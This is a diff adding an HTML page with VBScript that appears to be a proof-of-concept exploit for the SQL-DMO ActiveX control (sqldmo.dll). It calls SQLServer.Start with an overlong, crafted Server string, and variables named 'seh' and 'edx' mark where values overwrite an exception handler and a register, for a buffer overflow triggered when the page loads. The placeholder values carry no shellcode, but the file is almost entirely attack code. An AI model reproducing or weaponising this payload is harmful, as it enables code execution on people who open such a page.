@@ -1,0 +1,27 @@
+<html>
+<object classid='clsid:10020200-E260-11CF-AE68-00AA004A34D5' id='SQLServer' /></object>
+<script language='vbscript'>
+
+targetFile = "C:\Programmi\Microsoft SQL Server\80\Tools\Binn\sqldmo.dll"
+prototype  = "Sub Start ( ByVal StartMode As Boolean ,  [ ByVal Server As Variant ] ,  [ ByVal Login As Variant ] ,  [ ByVal Password As Variant ] )"
+memberName = "Start"
+progid     = "SQLDMO.SQLServer"
+argCount   = 4
+
+'edx = ecx
+edx       ="bb"
+seh       ="aa"
+StartMode =True
+Server
+="http://ZZZZ\YYYY\XXXX\WW?W\VVVV\AAAA\AAA\AAAAA\AAAA\AA@AA\tes\test\test\tes.\ttest\MMMM\LLLL\KKK\JJJJ\IIII\HH.H\GGGGG\FFFF\EEEE\DDD\CCCC\BBBB\AAA\A\\\\
+\\\\\:#$%AAAA\BBBB\CCCC\DD?D\EEEE\FFFF\GGG\\:#$%\HHHHH\IIII\te@st\tes\test\test\tes.aaaabbbbccccddddeeeeffffgggghhhhiiiiaaaaaaa" + seh + "CCDmmm" + edx +
+"nnnBBBB\AAAA\ZZZ\Z\\\\\\\\\:#$%YYYY\XXXX\WWWW\VV?V\UUUU\TTTT\SSS\\:#$%\RRRRR\QQQQ\PP@PP\OOO\NNNN\MMMM\LLL.\KKKKK\JJJJ\IIII\HHH\GGGG\FFFF\EE.E\DDDDD\CCCC
+\BBBB\AAA\AAAA\AAAA\AAA\A\\\\\\\\\:#$%AAAA\AAAA\AAAA\AA?A\wwww\vvvv\uuu\\:#$%\ttttt\ssss\rr@rr\qqq\pppp\oooo\nnn.\mmmmm\llll\kkkk\jjj\iiii\hhhh\gg.g\ffff
+f\eeee\dddd\ccc\bbbb\aaaa\AAA\A\\\\\\\"
+Login     ="aaaaaaaa"
+Password  ="bbbbbbbb"
+
+SQLServer.Start StartMode ,Server ,Login ,Password
+
+</script>
+</html>
